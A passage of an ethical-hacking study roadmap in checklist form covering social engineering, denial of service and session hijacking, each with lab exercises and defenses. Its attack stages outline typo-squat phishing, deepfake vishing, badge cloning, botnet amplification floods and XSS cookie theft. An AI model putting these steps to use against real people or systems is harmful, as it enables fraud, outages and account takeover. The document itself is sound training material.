- [ ] **Domain & Infrastructure Prep:** Register **typo-squatting domains** (e.g., `companysupport.com`, `company-login.net`) that mimic target portals; prepare **phishing landing pages**.

- [ ] **Social Media Profiling:** Mine **LinkedIn, Twitter, GitHub, Glassdoor** for **personal details, relationships, job changes** to craft personalized lures.

---

<a id="stage-2-the-digital-assault-remote-vectors"></a>

### **Stage 2: The Digital Assault (Remote Vectors)**

> [!TIP]
> **Goal:** Compromise the target from a distance via electronic channels.

- [ ] **Mass Campaign:** Launch **broad phishing campaigns** with generic lures (password resets, package delivery) for large-scale **credential harvesting**.

- [ ] **Executive Targeting:** Execute **whaling attacks** against **C-suite/CFO** using deep **OSINT context** (recent news, personal interests, vendor relationships) to bypass skepticism.

- [ ] **Mobile Vector:** Deploy **SMS phishing (smishing)** with **MFA reset codes, delivery notifications, bank alerts**; use **VoIP/voice phishing (vishing)** to call employees directly.

- [ ] **Watering Hole:** Compromise **industry-specific forums, GitHub repos, or shared tools** to inject **malware/tracking code** that targets specific teams via **drive-by downloads**.

- [ ] **Deepfake Vishing:** Use **voice cloning/video deepfakes** (e.g., ElevenLabs) for **executive impersonation** in calls/meetings.

- [ ] **ClickFix/ClearFake:** Simulate browser/OS errors that instruct users to **copy-paste provided PowerShell/terminal scripts** (“fix/update now”).

---

<a id="stage-3-the-human-element-direct-interaction"></a>

### **Stage 3: The Human Element (Direct Interaction)**

> [!TIP]
> **Goal:** Use psychology and social manipulation to bypass logic.

- [ ] **Voice Pretexting:** Call as **IT support, HR, vendor, auditor, law enforcement** using social engineering pretexts; use **authority, urgency, fear** to bypass critical thinking.

- [ ] **Authority & Compliance Trigger:** Leverage **IT/Security/Auditor/Legal persona** to demand compliance; abuse **helpfulness bias** to force password resets or system access.

- [ ] **Reciprocity & Obligation:** Provide small **favors (tech help, free tools)** to create sense of obligation; ask for credentials or access in return.

---

<a id="stage-4-the-physical-breach-boots-on-the-ground"></a>

### **Stage 4: The Physical Breach (Boots on the Ground)**

> [!TIP]
> **Goal:** Gain physical access to networks and facilities.

- [ ] **Tailgating:** Follow **authorized employees** into secure zones using badges/access cards; use **coffee cup hold, uniform/vendor persona** to bypass visual checks.

- [ ] **Shoulder Surfing:** Observe **PIN entry, password typing, screen content** in public spaces (airports, coffee shops, open offices) to capture credentials.

- [ ] **Badge Cloning:** Capture **RFID badge data** using **Proxmark3, ACR122U** and clone to malicious card; bypass **magnetic stripe readers** via cloning.

- [ ] **Physical Device Placement:** Plant **USB drops, rogue access points, hardware keyloggers** in common areas for **auto-execution** when connected by unsuspecting users.

---

<a id="stage-5-defense-awareness-the-shield"></a>

### **Stage 5: Defense & Awareness (The Shield)**

> [!TIP]
> **Goal:** Prevent the human hack through training and controls.

- [ ] **Authentication:** Enforce **MFA/2FA** (TOTP, hardware keys, push notifications) so password compromise alone doesn't grant access; watch for **MFA fatigue attacks**.

- [ ] **Verification Protocols:** Train staff to **challenge unknown callers** via **secondary channel callback**; never trust caller ID alone; verify requests through official channels.

- [ ] **Physical Security:** Enforce **no-tailgating policies, visitor escorts, badge display requirements, clean desk policies** to prevent **dumpster diving and shoulder surfing**.

- [ ] **Security Awareness:** Regular **phishing simulations, red team testing, security training** to build **skepticism and reporting culture**; reward **security-first behavior**.

- [ ] **MFA Resilience:** Teach differences between **phishing-resistant MFA (FIDO2/Passkeys)** vs **phishable MFA (SMS/Push/OTP)**; test and mitigate **MFA fatigue** scenarios.

<a id="lab-progression-part-10-social-engineering"></a>

### **Lab Progression (Part 10: Social Engineering)**

> [!TIP]
> **Goal:** Learn social engineering defensively and ethically.

- [ ] **Email Authentication Lab:** Configure and validate SPF, DKIM, and DMARC on a test domain or lab mail stack.
- [ ] **Header Forensics Lab:** Analyze benign/phishing email headers and identify sender path, SPF/DKIM/DMARC result, and suspicious infrastructure.
- [ ] **GoPhish Simulation Lab:** Run a consented internal lab campaign against test inboxes only; measure open/click/report rates.
- [ ] **Pretext Review:** Write three pretexts and then write the defensive awareness guidance that would defeat them.
  > [!IMPORTANT]
  > **Move-On Gate:** Produce a social-engineering simulation plan with ROE, consent model, metrics, and debrief template.

<a id="toc-part-11-denial-of-service"></a>
<a id="part-11-denial-of-service"></a>

## Part 11: Denial of Service

> **Safety Gate:** DoS testing is local-lab-only unless a written contract explicitly authorizes it. Never run DoS tools against public IPs, SaaS platforms, school networks, ISP infrastructure, or bug bounty targets unless the scope explicitly permits availability testing.

<a id="stage-1-objective-strategy-the-planning"></a>

### **Stage 1: Objective & Strategy (The Planning)**

> [!TIP]
> **Goal:** Understand DoS/DDoS scope and firepower requirements.

- [ ] **Denial of Service (DoS):** Single attacker sends **crafted traffic** to overwhelm a target's **CPU, bandwidth, or connections**; from one IP; **relatively easy detection**.

- [ ] **Distributed Denial of Service (DDoS):** **Multiple sources** (botnet, amplification servers) send traffic **simultaneously**; harder to trace and block; **stronger firepower**.

- [ ] **Target Assessment:** Identify **critical services** (web, DNS, mail, VPN) and **upstream bottlenecks** (ISP bandwidth, DDoS mitigation capacity) to determine **attack viability**.

---

<a id="stage-2-the-arsenal-attack-methods"></a>

### **Stage 2: The Arsenal (Attack Methods)**

> [!TIP]
> **Goal:** Select the right DoS technique for target vulnerabilities.

- [ ] **Volumetric Attacks:** Consume **bandwidth** using **SYN floods, UDP floods, ICMP floods** to saturate network pipes; use **DNS amplification, NTP reflection** to multiply traffic (1 request → 1000× response).

- [ ] **Protocol Attacks:** Exploit **TCP/IP stack weaknesses** (malformed packets, fragment handling, connection states) using **Ping of Death, Teardrop, SYN floods** to crash systems or exhaust connection limits.

- [ ] **Application-Layer Attacks:** Target **specific services** with **HTTP floods (Slowloris), database queries (CPU spike), cached assets** to overwhelm **web servers, APIs, load balancers** at Layer 7.

- [ ] **IoT/Botnets:** Compromise **webcams, routers, smart devices** via **default creds, unpatched firmware** to join **Mirai, Dridex-style botnets** for DDoS-as-a-Service.

---

<a id="stage-3-infrastructure-execution-the-assault"></a>

### **Stage 3: Infrastructure & Execution (The Assault)**

> [!TIP]
> **Goal:** Deploy and sustain the attack at scale.

- [ ] **Botnet Assembly:** Recruit **thousands of infected IoT/servers** or use **existing botnet services** (DDoS-as-a-Service, rent botnet time); establish **C&C control** via IRC/DNS/Peer-to-Peer.

- [ ] **Traffic Generation:** Use **tools like hping3, slowhttptest, LOIC, Colasoft PacketBuilder** to craft and blast custom packets; coordinate **multi-vector attacks** (volumetric + protocol + app-layer simultaneously).

- [ ] **Proxy/Spoofing:** Use **open reflectors/amplifiers** (DNS servers, NTP, SNMP) to amplify traffic; spoof **source IP addresses** to obscure attacker origin.

- [ ] **Duration & Monitoring:** Sustain attack for **hours/days** while monitoring **target availability, ISP response, filtering changes**; adjust payload/vector on-the-fly.

---

<a id="stage-4-defense-mitigation-the-shield"></a>

### **Stage 4: Defense & Mitigation (The Shield)**

> [!TIP]
> **Goal:** Detect, absorb, and neutralize DoS attacks.

- [ ] **Edge Defense:** Deploy **Cloudflare, Akamai, AWS Shield Standard** to absorb DDoS at **ISP/CDN level** before traffic reaches origin; filter **malformed packets, spoofed IPs** at network edge.

- [ ] **Rate Limiting & Throttling:** Implement **connection limits, request rate caps, CAPTCHAs, geo-blocking** to let legitimate users through while rejecting flood traffic.

- [ ] **Monitoring & Detection:** Deploy **NetFlow/sFlow analysis, IDS/IPS (Suricata, Zeek)** to detect **unusual traffic patterns, connection spikes, protocol anomalies**; alert on **RTO timeouts, CPU/bandwidth saturation**.

- [ ] **Architectural Resilience:** Use **anycast DNS, geographically distributed servers, auto-scaling, load balancing** to spread load; oversizing infrastructure to **absorb baseline attacks**; prepare **incident response playbooks**.

- [ ] **ISP/Carrier Coordination:** Work with **ISP's DDoS mitigation services** to scrub traffic upstream; establish **BGP blackholing** to discard attack traffic at border; maintain **redundant ISPs/circuits**.

<a id="lab-progression-part-11-denial-of-service"></a>

### **Lab Progression (Part 11: Denial of Service)**

| Level | Task                                                          | Deliverable                              |
| ----- | ------------------------------------------------------------- | ---------------------------------------- |
| 1     | Study DoS attack types and classify by OSI layer              | Classification document with examples    |
| 2     | Simulate SYN flood against lab web server with hping3         | Traffic capture + server impact analysis |
| 3     | Test Slowloris against Apache in lab, then apply mitigation   | Before/after performance comparison      |
| 4     | Configure rate limiting and SYN cookies on lab firewall       | Firewall configuration + test results    |
| 5     | Design a DDoS defense architecture for a hypothetical company | Architecture diagram + defense plan      |

> [!IMPORTANT]
> **Move-On Gate:** You can explain and classify DoS/DDoS attack types, demonstrate basic DoS in a lab, and design defensive countermeasures at the network, host, and application layers.

---

<a id="toc-part-12-session-hijacking"></a>
<a id="part-12-session-hijacking"></a>

## Part 12: Session Hijacking

<a id="stage-1-reconnaissance-vulnerability-analysis"></a>

### **Stage 1: Reconnaissance & Vulnerability Analysis**

> [!TIP]
> **Goal:** Find a target and identify its weaknesses.

- [ ] **Target Identification:** Use **Reconnaissance** and **OSINT** to identify target web applications.

- [ ] **Protocol Analysis:** Check if the application uses **Unsecure Protocols** (HTTP) for any part of the session, making it vulnerable to sniffing.

- [ ] **Session Mechanism Analysis:** Study **session ID generation, cookie attributes, token entropy** for weak patterns.

- [ ] **Vulnerability Scanning:** Test for **XSS, CSRF, MITM susceptibility, weak session timeouts**.

---

<a id="stage-2-stealing-the-session-id-the-attack-vectors"></a>

### **Stage 2: Stealing the Session ID (The Attack Vectors)**

> [!TIP]
> **Goal:** Execute the attack to acquire the victim's session token.

- [ ] **Network Sniffing:** If HTTP is in use, launch **packet capture** with **Wireshark** on the local network or from a **Rogue Access Point** to intercept session cookies.

- [ ] **Client-Side Injection:** Craft and deliver an **XSS** payload (via **Phishing** or a stored vulnerability) to steal `document.cookie` from the user's browser.

- [ ] **Man-in-the-Middle:** Execute a **MITM** attack using **ARP spoofing, DNS spoofing**, or **SSL stripping** to intercept encrypted sessions.

- [ ] **Session Fixation:** Force victim to use **attacker-controlled session ID** by injecting it via URL or cookies before authentication.

- [ ] **Browser Extension Abuse:** Exploit **malicious browser extensions** to exfiltrate cookies from victim's browser storage.

---

<a id="stage-3-execution-impersonation"></a>

### **Stage 3: Execution & Impersonation**

> [!TIP]
> **Goal:** Use the stolen token to access the user's account.

- [ ] **Token Injection & Hijack:** Inject the stolen session ID into your browser cookies to achieve **impersonation** of the victim, bypassing **authentication** completely.

- [ ] **Session Replay:** Reuse captured **authentication tokens, API keys, JWT** to access protected resources.

- [ ] **Privilege Escalation:** If session belongs to **privileged user**, exploit to gain **administrative access**.

---

<a id="stage-4-defense-mitigation-the-shield"></a>

### **Stage 4: Defense & Mitigation (The Shield)**

> [!TIP]
> **Goal:** Prevent the attack from succeeding.

- [ ] **Enforce Encryption:** Mandate **TLS 1.2+** for all web traffic; implement **HSTS** to prevent SSL stripping.

- [ ] **Secure Cookie Attributes:** Implement `HttpOnly`, `Secure`, `SameSite=Strict` flags on cookies to mitigate **XSS** theft and CSRF.

- [ ] **Session Management:** Implement **session regeneration after login**, **absolute/idle timeouts**, **IP/User-Agent binding**.

- [ ] **Multi-Factor Authentication:** Deploy **MFA/2FA** to ensure stolen session token alone is insufficient for sensitive actions.

- [ ] **Network Monitoring:** Use **IDS/IPS** to detect **MITM patterns, ARP spoofing, SSL stripping attempts**. _(See Part 9 for canonical spoofing coverage.)_

<a id="lab-progression-part-12-session-hijacking"></a>

### **Lab Progression (Part 12: Session Hijacking)**

| Level | Task                                                              | Deliverable                           |
| ----- | ----------------------------------------------------------------- | ------------------------------------- |
| 1     | Analyze session cookies in a lab web app (entropy, attributes)    | Cookie analysis report                |
| 2     | Perform session fixation attack on a vulnerable lab app           | Attack steps + session token evidence |
| 3     | Steal session cookies via XSS in DVWA/WebGoat                     | Session hijack lab report             |
| 4     | Implement secure session management on a lab app                  | Hardened configuration document       |
| 5     | Test session hijacking defenses (regeneration, binding, timeouts) | Defense effectiveness report          |

> [!IMPORTANT]
> **Move-On Gate:** You can identify weak session management, perform session hijacking via multiple vectors (fixation, XSS, sniffing), and implement secure session handling with proper cookie attributes, regeneration, and MFA.

> 📌 **Cross-Reference:** Web application session attacks (JWT hijacking, OAuth token theft, API session management, cookie-based CSRF) are covered in depth in **[Part 17: Web Application Hacking](Phase-4.md#part-17-web-application-hacking)** and **[Part 19: API Security](Phase-4.md#part-19-api-security)** (Phase 4). The techniques in this Part focus on network-layer session attacks; web-layer attacks require Phase 4 knowledge.

---

---

### 🏆 Phase 2 Capstone Project

**Complete a Full Penetration Test on a Deliberately Vulnerable Lab**

Select a multi-machine vulnerable environment (HTB Pro Lab, VulnHub chain, or your own Phase 1 lab):

- [ ] **Perform full recon** (passive + active footprinting, scanning, enumeration)
- [ ] **Achieve initial access** on at least 2 machines using different vectors
- [ ] **Escalate privileges** to root/SYSTEM on each machine
- [ ] **Demonstrate lateral movement** between at least 2 systems
- [ ] **Document the full kill chain** from recon to impact

**Deliverables:**

- [ ] Professional penetration test report using PTES template (executive summary, methodology, findings, remediation)
- [ ] Attack chain diagram showing the complete path from initial access to domain compromise
- [ ] All evidence (screenshots, tool output, scripts) organized in your Git repository

> [!IMPORTANT]
> **Capstone Gate:** Your report must be structured professionally enough to present to a client. A reader should understand every step without needing to ask questions.

---

### 🧭 Phase 2 Reflection & Competency Check

- [ ] **Reflection:** Which stage of the attack chain required the most iteration: recon, enumeration, exploitation, privilege escalation, or lateral movement?
- [ ] **Reflection:** What would a defender have seen at each major step?
- [ ] **Competency:** Can you perform recon and enumeration without jumping prematurely to exploitation?
- [ ] **Competency:** Can you prove every finding with evidence and explain business impact without exaggeration?
- [ ] **Competency:** Can you produce a complete attack chain diagram and client-ready report from raw notes?

> [!IMPORTANT]
> **Phase Completion Gate:** Move on only when you can complete an authorized lab penetration test end-to-end, document it professionally, and explain both attacker actions and defender visibility.

---

<a id="toc-part-32-physical-penetration-testing"></a>
